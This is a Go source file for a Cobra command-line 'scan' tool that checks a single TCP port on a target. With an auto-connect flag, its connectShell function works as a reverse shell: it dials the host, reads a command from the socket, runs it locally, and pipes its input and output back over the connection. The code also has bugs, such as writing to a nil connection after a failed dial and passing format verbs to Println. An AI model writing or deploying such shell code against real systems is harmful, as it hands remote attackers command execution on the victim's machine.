package cmd

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"

	"github.com/spf13/cobra"
)

var (
	Target   string
	Port     int
	AutoFlag bool
)

// scanCmd represents the scan command
var scanCmd = &cobra.Command{
	Use:   "scan",
	Short: "A command that will scan a target for open ports.",
	Long:  ``,
	Run: func(cmd *cobra.Command, args []string) {
		fmt.Println("scan called")
		Target, _ := cmd.Flags().GetString("target")
		fmt.Println("used target %s", Target)
		Port, _ := cmd.Flags().GetInt("port")
		fmt.Println("used port %s", Port)

		scan(Target, Port)

		autoConn, _ := cmd.Flags().GetBool("auto connect")
		if autoConn {
			fmt.Println("autoconn called")
			connectShell(Target, Port)
		}

	},
}

func init() {
	rootCmd.AddCommand(scanCmd)
	scanCmd.Flags().StringVarP(&Target, "target", "t", "", "An IP addrress to scan for an open port.")
	scanCmd.MarkFlagRequired("target")
	scanCmd.Flags().IntVarP(&Port, "port", "p", 0, "A port to scan.")
	scanCmd.MarkFlagRequired("port")
	scanCmd.Flags().BoolVarP(&AutoFlag, "auto connect", "a", false, "A switch (y or n) to auto connect to open port.")

}

func scan(target string, port int) {

	targ := fmt.Sprintf("%s:%d", target, port)
	_, err := net.Dial("tcp", targ)

	if err == nil {

		fmt.Printf("%s:%d open!\n", target, port)

	} else {

		fmt.Printf("%s:%d closed!\n", target, port)
	}

	return

}

func connectShell(target string, port int) {
	targ := fmt.Sprintf("%s:%d", target, port)
	conn, err := net.Dial("tcp", targ)
	// TODO
	// get os type and do one for windows one for linux
	if err != nil {
		fmt.Fprintf(conn, "%s\n", err)
	}
	remoteCmd, err := bufio.NewReader(conn).ReadString('\n')

	if err != nil {
		fmt.Fprintf(conn, "%s\n", err)
	}
	newCmd := strings.TrimSuffix(remoteCmd, "\n")
	command := exec.Command(newCmd)
	command.Stdin = conn
	command.Stdout = conn
	command.Stderr = conn
	command.Run()

}
